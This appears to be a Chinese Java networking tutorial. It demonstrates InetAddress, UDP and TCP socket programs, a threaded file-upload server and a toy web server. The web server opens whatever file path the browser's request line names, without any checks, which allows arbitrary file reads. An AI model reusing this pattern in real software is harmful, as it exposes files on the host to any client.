<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    InetAddress类概述</span></span><br><span class="line"><span class="comment">        * 一个该类的对象就代表一个IP地址对象。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    InetAddress类成员方法</span></span><br><span class="line"><span class="comment">        * static InetAddress getLocalHost()</span></span><br><span class="line"><span class="comment">            * 获得本地主机IP地址对象</span></span><br><span class="line"><span class="comment">        * static InetAddress getByName(String host)</span></span><br><span class="line"><span class="comment">            * 根据IP地址字符串或主机名获得对应的IP地址对象</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        * String getHostName();获得主机名</span></span><br><span class="line"><span class="comment">        * String getHostAddress();获得IP地址字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InetAddressDemo01</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 获得本地主机IP地址对象</span></span><br><span class="line">        InetAddress inet01 = InetAddress.getLocalHost();</span><br><span class="line">        <span class="comment">// pkxingdeMacBook-Pro.local/10.211.55.2</span></span><br><span class="line">        <span class="comment">// 主机名/ip地址字符串</span></span><br><span class="line">        System.out.println(inet01);</span><br><span class="line">        <span class="comment">// 根据IP地址字符串或主机名获得对应的IP地址对象</span></span><br><span class="line">        <span class="comment">// InetAddress inet02 = InetAddress.getByName("192.168.73.97");</span></span><br><span class="line">        InetAddress inet02 = InetAddress.getByName(<span class="string">"baidu.com"</span>);</span><br><span class="line">        System.out.println(inet02);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得主机名</span></span><br><span class="line">        String hostName = inet01.getHostName();</span><br><span class="line">        System.out.println(hostName);</span><br><span class="line">        <span class="comment">// 获得IP地址字符串</span></span><br><span class="line">        String hostAddress = inet01.getHostAddress();</span><br><span class="line">        System.out.println(hostName);</span><br><span class="line">        System.out.println(hostAddress);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第二章-UDP通信程序"><a href="#第二章-UDP通信程序" class="headerlink" title="第二章 UDP通信程序"></a>第二章 UDP通信程序</h1><h2 id="2-1-UDP协议概述"><a href="#2-1-UDP协议概述" class="headerlink" title="2.1 UDP协议概述"></a>2.1 UDP协议概述</h2><p>​       UDP是无连接通信协议，即在数据传输时，数据的发送端和接收端不建立逻辑连接。简单来说，当一台计算机向另外一台计算机发送数据时，发送端不会确认接收端是否存在，就会发出数据，同样接收端在收到数据时，也不会向发送端反馈是否收到数据。</p>
<p>​        由于使用UDP协议消耗资源小，通信效率高，所以通常都会用于音频、视频和普通数据的传输例如视频会议都使用UDP协议，因为这种情况即使偶尔丢失一两个数据包，也不会对接收结果产生太大影响。</p>
<p>​        但是在使用UDP协议传送数据时，由于UDP的面向无连接性，不能保证数据的完整性，因此在传输重要数据时不建议使用UDP协议。UDP通信过程如下图所示：</p>
<p><img data-src="https://i.loli.net/2021/01/23/nuFoYkO4zrcxRSl.png" alt="1566447182200"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">UDP协议的特点</span><br><span class="line">    * 面向无连接的协议</span><br><span class="line">    * 发送端只管发送，不确认对方是否能收到（同时接收端无论收到与否都不会产生应答）。</span><br><span class="line">    * 基于数据包进行数据传输。</span><br><span class="line">    * 发送数据的大小限制<span class="number">64</span>K以内</span><br><span class="line">    * 因为面向无连接，速度快，但是不可靠。</span><br><span class="line"></span><br><span class="line">UDP协议的使用场景</span><br><span class="line">    * 即时通讯</span><br><span class="line">    * 在线视频</span><br><span class="line">    * 网络语音电话</span><br><span class="line"></span><br><span class="line">UDP协议相关的两个类</span><br><span class="line">    * DatagramPacket</span><br><span class="line">        * 数据包对象</span><br><span class="line">        * 作用：用来封装要发送或要接收的数据，比如：集装箱</span><br><span class="line">    * DatagramSocket</span><br><span class="line">        * 发送对象</span><br><span class="line">        * 作用：用来发送或接收数据包，比如：码头</span><br><span class="line"></span><br><span class="line">DatagramPacket类构造方法</span><br><span class="line">    * DatagramPacket(<span class="keyword">byte</span>[] buf, <span class="keyword">int</span> length, InetAddress address, <span class="keyword">int</span> port)</span><br><span class="line">        * 创建发送端数据包对象</span><br><span class="line">        * buf：要发送的内容，字节数组</span><br><span class="line">        * length：要发送内容的长度，单位是字节</span><br><span class="line">        * address：接收端的IP地址对象</span><br><span class="line">        * port：接收端的端口号</span><br><span class="line">    * DatagramPacket(<span class="keyword">byte</span>[] buf, <span class="keyword">int</span> length)</span><br><span class="line">        * 创建接收端的数据包对象</span><br><span class="line">        * buf：用来存储接收到内容</span><br><span class="line">        * length：能够接收内容的长度</span><br><span class="line"></span><br><span class="line">DatagramPacket类常用方法</span><br><span class="line">    * <span class="function"><span class="keyword">int</span> <span class="title">getLength</span><span class="params">()</span> 获得实际接收到的字节个数</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">DatagramSocket类构造方法</span></span><br><span class="line"><span class="function">    * <span class="title">DatagramSocket</span><span class="params">()</span> 创建发送端的Socket对象，系统会随机分配一个端口号。</span></span><br><span class="line"><span class="function">    * <span class="title">DatagramSocket</span><span class="params">(<span class="keyword">int</span> port)</span> 创建接收端的Socket对象并指定端口号</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">DatagramSocket类成员方法</span></span><br><span class="line"><span class="function">    * <span class="keyword">void</span> <span class="title">send</span><span class="params">(DatagramPacket dp)</span> 发送数据包</span></span><br><span class="line"><span class="function">    * <span class="keyword">void</span> <span class="title">receive</span><span class="params">(DatagramPacket p)</span> 接收数据包</span></span><br></pre></td></tr></table></figure>

<h2 id="2-2-UDP通信案例"><a href="#2-2-UDP通信案例" class="headerlink" title="2.2 UDP通信案例"></a>2.2 UDP通信案例</h2><ul>
<li>需求：教师的电脑的一个程序发送数据，一个程序接收数据，使用的教师本机的ip。</li>
</ul>
<h3 id="2-2-1-UDP发送端代码实现"><a href="#2-2-1-UDP发送端代码实现" class="headerlink" title="2.2.1 UDP发送端代码实现"></a>2.2.1 UDP发送端代码实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> UDP网络编程;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.sql.DataSource;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDPClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 定义一个字符串</span></span><br><span class="line">        String message = <span class="string">"This is Client"</span>;</span><br><span class="line">        <span class="comment">// 调用 String 类的方法 getBytes 将字符串转为字节数组</span></span><br><span class="line">        <span class="keyword">byte</span>[] buf = message.getBytes();</span><br><span class="line">        <span class="comment">// 创建数据包对象</span></span><br><span class="line">        DatagramPacket dp = <span class="keyword">new</span> DatagramPacket(buf,buf.length, InetAddress.getLocalHost(),<span class="number">6666</span>);    <span class="comment">// 数据包对象的目的端口号要与服务器的一致，不然对面接收不到</span></span><br><span class="line">        <span class="comment">// 创建 Socket 对象准备发送数据</span></span><br><span class="line">        DatagramSocket ds = <span class="keyword">new</span> DatagramSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="comment">// 调用 send 函数进行数据的发送</span></span><br><span class="line">        ds.send(dp);</span><br><span class="line">        <span class="comment">// 调用 close 函数将 Socket 套接字关闭</span></span><br><span class="line">        ds.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-2-UDP接收端代码实现"><a href="#2-2-2-UDP接收端代码实现" class="headerlink" title="2.2.2 UDP接收端代码实现"></a>2.2.2 UDP接收端代码实现</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> UDP网络编程;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.DatagramPacket;</span><br><span class="line"><span class="keyword">import</span> java.net.DatagramSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.SocketException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDPServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 预创建一个字符数组准备保存收到的消息</span></span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">// 创建一个数据包对象</span></span><br><span class="line">        DatagramPacket datagramPacket = <span class="keyword">new</span> DatagramPacket(buf,buf.length);</span><br><span class="line">        <span class="comment">// 创建一个 Socket 套接字</span></span><br><span class="line">        DatagramSocket ds = <span class="keyword">new</span> DatagramSocket(<span class="number">6666</span>);</span><br><span class="line">        <span class="comment">// 接受数据包</span></span><br><span class="line">        ds.receive(datagramPacket);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得各种信息</span></span><br><span class="line">        System.out.println(<span class="string">"从"</span> + datagramPacket.getAddress() +<span class="string">"端口号为"</span> + datagramPacket.getPort() + <span class="string">"共收到"</span> + datagramPacket.getLength() + <span class="string">"字节的消息"</span>);</span><br><span class="line">        <span class="comment">// 将获得字节数组转化为字符串输出</span></span><br><span class="line">        System.out.println(<span class="string">"收到信息："</span> + <span class="keyword">new</span> String(buf , <span class="number">0</span> ,datagramPacket.getLength()));</span><br><span class="line">        System.out.println(datagramPacket.getLength());</span><br><span class="line"></span><br><span class="line">        ds.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第三章-TCP通信程序"><a href="#第三章-TCP通信程序" class="headerlink" title="第三章 TCP通信程序"></a>第三章 TCP通信程序</h1><h2 id="3-1-TCP协议概述"><a href="#3-1-TCP协议概述" class="headerlink" title="3.1 TCP协议概述"></a>3.1 TCP协议概述</h2><ul>
<li>TCP协议是面向连接的通信协议，即在传输数据前先在客户端和服务器端建立逻辑连接，然后再传输数据。它提供了两台计算机之间可靠无差错的数据传输。TCP通信过程如下图所示：</li>
</ul>
<p><img data-src="https://i.loli.net/2021/01/23/eFC8TGBPxJpdDAo.png" alt="1566446503937"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">TCP ==&gt; Transfer Control Protocol ==&gt; 传输控制协议</span><br><span class="line">TCP协议的特点</span><br><span class="line">    * 面向连接的协议</span><br><span class="line">    * 只能由客户端主动发送数据给服务器端，服务器端接收到数据之后，可以给客户端响应数据。</span><br><span class="line">    * 通过三次握手建立连接，连接成功形成数据传输通道。</span><br><span class="line">    * 通过四次挥手断开连接</span><br><span class="line">    * 基于IO流进行数据传输</span><br><span class="line">    * 传输数据大小没有限制</span><br><span class="line">    * 因为面向连接的协议，速度慢，但是是可靠的协议。</span><br><span class="line"></span><br><span class="line">TCP协议的使用场景</span><br><span class="line">    * 文件上传和下载</span><br><span class="line">    * 邮件发送和接收</span><br><span class="line">    * 远程登录</span><br><span class="line"></span><br><span class="line">TCP协议相关的类</span><br><span class="line">    * Socket</span><br><span class="line">        * 一个该类的对象就代表一个客户端程序。</span><br><span class="line">    * ServerSocket</span><br><span class="line">        * 一个该类的对象就代表一个服务器端程序。</span><br><span class="line"></span><br><span class="line">Socket类构造方法</span><br><span class="line">    * Socket(String host, <span class="keyword">int</span> port)</span><br><span class="line">        * 根据ip地址字符串和端口号创建客户端Socket对象</span><br><span class="line">        * 注意事项：只要执行该方法，就会立即连接指定的服务器程序，如果连接不成功，则会抛出异常。</span><br><span class="line">            如果连接成功，则表示三次握手通过。</span><br><span class="line"></span><br><span class="line">Socket类常用方法</span><br><span class="line">    * <span class="function">OutputStream <span class="title">getOutputStream</span><span class="params">()</span></span>; 获得字节输出流对象</span><br><span class="line">    * <span class="function">InputStream <span class="title">getInputStream</span><span class="params">()</span></span>;获得字节输入流对象</span><br></pre></td></tr></table></figure>


<h2 id="3-2-TCP通信案例"><a href="#3-2-TCP通信案例" class="headerlink" title="3.2 TCP通信案例"></a>3.2 TCP通信案例</h2><h3 id="3-2-2-客户端向服务器发送数据"><a href="#3-2-2-客户端向服务器发送数据" class="headerlink" title="3.2.2 客户端向服务器发送数据"></a>3.2.2 客户端向服务器发送数据</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">TCP客户端代码实现步骤</span></span><br><span class="line"><span class="comment">        * 创建客户端Socket对象并指定服务器地址和端口号</span></span><br><span class="line"><span class="comment">        * 调用Socket对象的getOutputStream方法获得字节输出流对象</span></span><br><span class="line"><span class="comment">        * 调用字节输出流对象的write方法往服务器端输出数据</span></span><br><span class="line"><span class="comment">        * 调用Socket对象的getInputStream方法获得字节输入流对象</span></span><br><span class="line"><span class="comment">        * 调用字节输入流对象的read方法读取服务器端返回的数据</span></span><br><span class="line"><span class="comment">        * 关闭Socket对象断开连接。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// TCP客户端代码实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TCPClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 要发送的内容</span></span><br><span class="line">        String content = <span class="string">"你好TCP服务器端，约吗"</span>;</span><br><span class="line">        <span class="comment">// 创建Socket对象</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(<span class="string">"192.168.73.99"</span>,<span class="number">9999</span>);</span><br><span class="line">        <span class="comment">// System.out.println(socket);</span></span><br><span class="line">        <span class="comment">// 获得字节输出流对象</span></span><br><span class="line">        OutputStream out = socket.getOutputStream();</span><br><span class="line">        <span class="comment">// 输出数据到服务器端</span></span><br><span class="line">        out.write(content.getBytes());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得字节输入流对象</span></span><br><span class="line">        InputStream in = socket.getInputStream();</span><br><span class="line">        <span class="comment">// 创建字节数组：用来存储读取到服务器端数据</span></span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">// 读取服务器端返回的数据</span></span><br><span class="line">        <span class="keyword">int</span> len = in.read(buf);</span><br><span class="line">        System.out.println(<span class="string">"len = "</span> + len);</span><br><span class="line">        System.out.println(<span class="string">"服务器端返回的内容 = "</span> + <span class="keyword">new</span> String(buf,<span class="number">0</span>,len));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关闭socket对象</span></span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-3-3-服务器向客户端回写数据"><a href="#3-3-3-服务器向客户端回写数据" class="headerlink" title="3.3.3 服务器向客户端回写数据"></a>3.3.3 服务器向客户端回写数据</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    TCP服务器端代码实现</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ServerSocket类构造方法</span></span><br><span class="line"><span class="comment">        * ServerSocket(int port) 根据指定的端口号开启服务器。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    ServerSocket类常用方法</span></span><br><span class="line"><span class="comment">        *  Socket accept() 等待客户端连接并获得与客户端关联的Socket对象</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    TCP服务器端代码实现步骤</span></span><br><span class="line"><span class="comment">        * 创建ServerSocket对象并指定端口号(相当于开启了一个服务器)</span></span><br><span class="line"><span class="comment">        * 调用ServerSocket对象的accept方法等待客端户连接并获得对应Socket对象</span></span><br><span class="line"><span class="comment">        * 调用Socket对象的getInputStream方法获得字节输入流对象</span></span><br><span class="line"><span class="comment">        * 调用字节输入流对象的read方法读取客户端发送的数据</span></span><br><span class="line"><span class="comment">        * 调用Socket对象的getOutputStream方法获得字节输出流对象</span></span><br><span class="line"><span class="comment">        * 调用字节输出流对象的write方法往客户端输出数据</span></span><br><span class="line"><span class="comment">        * 关闭Socket和ServerSocket对象</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TCPServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">// 创建服务器ocket对象</span></span><br><span class="line">        ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">9999</span>);</span><br><span class="line">        <span class="comment">// 等待客户端连接并获得与客户端关联的Socket对象</span></span><br><span class="line">        Socket socket = serverSocket.accept();</span><br><span class="line">        <span class="comment">// 获得字节输入流对象</span></span><br><span class="line">        InputStream in = socket.getInputStream();</span><br><span class="line">        <span class="comment">// 创建字节数组：用来存储读取到客户端发送的数据</span></span><br><span class="line">        <span class="keyword">byte</span>[] buf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="comment">// 读取客户端发送过来的数据</span></span><br><span class="line">        <span class="keyword">int</span> len = in.read(buf);</span><br><span class="line">        System.out.println(<span class="string">"len = "</span> + len);</span><br><span class="line">        System.out.println(<span class="string">"客户端发送的数据 = "</span> + <span class="keyword">new</span> String(buf,<span class="number">0</span>,len));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得字节输出流对象</span></span><br><span class="line">        OutputStream out = socket.getOutputStream();</span><br><span class="line">        <span class="comment">// 往客户端输出数据</span></span><br><span class="line">        out.write(<span class="string">"约你妹"</span>.getBytes());</span><br><span class="line">       </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 关闭socket</span></span><br><span class="line">        socket.close();</span><br><span class="line">        <span class="comment">// 关闭服务器（在实际开发中，服务器一般不会关闭）</span></span><br><span class="line">        serverSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第四章-综合案例"><a href="#第四章-综合案例" class="headerlink" title="第四章 综合案例"></a>第四章 综合案例</h1><h2 id="4-1-文件上传案例"><a href="#4-1-文件上传案例" class="headerlink" title="4.1 文件上传案例"></a>4.1 文件上传案例</h2><h3 id="文件上传分析图解"><a href="#文件上传分析图解" class="headerlink" title="文件上传分析图解"></a>文件上传分析图解</h3><ol>
<li><p>【客户端】输入流，从硬盘读取文件数据到程序中。</p>
</li>
<li><p>【客户端】输出流，写出文件数据到服务端。</p>
</li>
<li><p>【服务端】输入流，读取文件数据到服务端程序。</p>
</li>
<li><p>【服务端】输出流，写出文件数据到服务器硬盘中。</p>
</li>
<li><p>【服务端】获取输出流，回写数据。</p>
</li>
<li><p>【客户端】获取输入流，解析回写数据。</p>
</li>
</ol>
<p><img data-src="https://i.loli.net/2021/01/23/lXz1bRTjcOZAH6K.png" alt="1566446548503"></p>
<h3 id="案例实现"><a href="#案例实现" class="headerlink" title="案例实现"></a>案例实现</h3><p>服务器端实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUpload_Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"服务器 启动.....  "</span>);</span><br><span class="line">        <span class="comment">// 1. 创建服务端ServerSocket</span></span><br><span class="line">        ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">6666</span>);</span><br><span class="line">        <span class="comment">// 2. 循环接收,建立连接</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            Socket accept = serverSocket.accept();</span><br><span class="line">          	<span class="comment">/*</span></span><br><span class="line"><span class="comment">          	3. socket对象交给子线程处理,进行读写操作</span></span><br><span class="line"><span class="comment">               Runnable接口中,只有一个run方法,使用lambda表达式简化格式</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> (</span><br><span class="line">                    <span class="comment">//3.1 获取输入流对象</span></span><br><span class="line">                    BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(accept.getInputStream());</span><br><span class="line">                    <span class="comment">//3.2 创建输出流对象, 保存到本地 .</span></span><br><span class="line">                    FileOutputStream fis = <span class="keyword">new</span> FileOutputStream(System.currentTimeMillis() + <span class="string">".jpg"</span>);</span><br><span class="line">                    BufferedOutputStream bos = <span class="keyword">new</span> BufferedOutputStream(fis);</span><br><span class="line">                ) &#123;</span><br><span class="line">                    <span class="comment">// 3.3 读写数据</span></span><br><span class="line">                    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">8</span>];</span><br><span class="line">                    <span class="keyword">int</span> len;</span><br><span class="line">                    <span class="keyword">while</span> ((len = bis.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        bos.write(b, <span class="number">0</span>, len);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 4.=======信息回写===========================</span></span><br><span class="line">                    System.out.println(<span class="string">"back ........"</span>);</span><br><span class="line">                    OutputStream out = accept.getOutputStream();</span><br><span class="line">                    out.write(<span class="string">"上传成功"</span>.getBytes());</span><br><span class="line">                    out.close();</span><br><span class="line">                    <span class="comment">//================================</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">//5. 关闭 资源</span></span><br><span class="line">                    bos.close();</span><br><span class="line">                    bis.close();</span><br><span class="line">                    accept.close();</span><br><span class="line">                    System.out.println(<span class="string">"文件上传已保存"</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FileUpload_Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 1.创建流对象</span></span><br><span class="line">        <span class="comment">// 1.1 创建输入流,读取本地文件</span></span><br><span class="line">        BufferedInputStream bis = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"test.jpg"</span>));</span><br><span class="line">        <span class="comment">// 1.2 创建输出流,写到服务端</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(<span class="string">"localhost"</span>, <span class="number">6666</span>);</span><br><span class="line">        BufferedOutputStream bos = <span class="keyword">new</span> BufferedOutputStream(socket.getOutputStream());</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.写出数据.</span></span><br><span class="line">        <span class="keyword">byte</span>[] b  = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span> * <span class="number">8</span> ];</span><br><span class="line">        <span class="keyword">int</span> len ;</span><br><span class="line">        <span class="keyword">while</span> (( len  = bis.read(b))!=-<span class="number">1</span>) &#123;</span><br><span class="line">            bos.write(b, <span class="number">0</span>, len);</span><br><span class="line">        &#125;</span><br><span class="line">      	<span class="comment">// 关闭输出流,通知服务端,写出数据完毕</span></span><br><span class="line">        socket.shutdownOutput();</span><br><span class="line">        System.out.println(<span class="string">"文件发送完毕"</span>);</span><br><span class="line">        <span class="comment">// 3. =====解析回写============</span></span><br><span class="line">        InputStream in = socket.getInputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] back = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">20</span>];</span><br><span class="line">        in.read(back);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(back));</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="comment">// ============================</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.释放资源</span></span><br><span class="line">        socket.close();</span><br><span class="line">        bis.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="4-2-模拟B-S服务器"><a href="#4-2-模拟B-S服务器" class="headerlink" title="4.2 模拟B\S服务器"></a>4.2 模拟B\S服务器</h2><p>模拟网站服务器，使用浏览器访问自己编写的服务端程序，查看网页效果。</p>
<h3 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h3><ol>
<li>准备页面数据，web文件夹。</li>
<li>我们模拟服务器端，ServerSocket类监听端口，使用浏览器访问，查看网页效果</li>
</ol>
<h3 id="案例实现-1"><a href="#案例实现-1" class="headerlink" title="案例实现"></a>案例实现</h3><p>浏览器工作原理是遇到图片会开启一个线程进行单独的访问,因此在服务器端加入线程技术。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ServerSocket server = <span class="keyword">new</span> ServerSocket(<span class="number">8888</span>);</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">            Socket socket = server.accept();</span><br><span class="line">            <span class="keyword">new</span> Thread(<span class="keyword">new</span> Web(socket)).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Socket socket;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Web</span><span class="params">(Socket socket)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.socket=socket;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//转换流,读取浏览器请求第一行</span></span><br><span class="line">            BufferedReader readWb = <span class="keyword">new</span></span><br><span class="line">                    BufferedReader(<span class="keyword">new</span> InputStreamReader(socket.getInputStream()));</span><br><span class="line">            String requst = readWb.readLine();</span><br><span class="line">            <span class="comment">//取出请求资源的路径</span></span><br><span class="line">            String[] strArr = requst.split(<span class="string">" "</span>);</span><br><span class="line">            System.out.println(Arrays.toString(strArr));</span><br><span class="line">            String path = strArr[<span class="number">1</span>].substring(<span class="number">1</span>);</span><br><span class="line">            System.out.println(path);</span><br><span class="line"></span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(path);</span><br><span class="line">            System.out.println(fis);</span><br><span class="line">            <span class="keyword">byte</span>[] bytes= <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> len = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//向浏览器 回写数据</span></span><br><span class="line">            OutputStream out = socket.getOutputStream();</span><br><span class="line">            out.write(<span class="string">"HTTP/1.1 200 OK\r\n"</span>.getBytes());</span><br><span class="line">            out.write(<span class="string">"Content-Type:text/html\r\n"</span>.getBytes());</span><br><span class="line">            out.write(<span class="string">"\r\n"</span>.getBytes());</span><br><span class="line">            <span class="keyword">while</span>((len = fis.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                out.write(bytes,<span class="number">0</span>,len);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">            out.close();</span><br><span class="line">            readWb.close();</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>访问效果：</strong></p>
<p><img data-src="https://i.loli.net/2021/01/23/QlK9EfPNFpUWrqX.png" alt="1566446578300"></p>
<p><strong>图解：</strong></p>
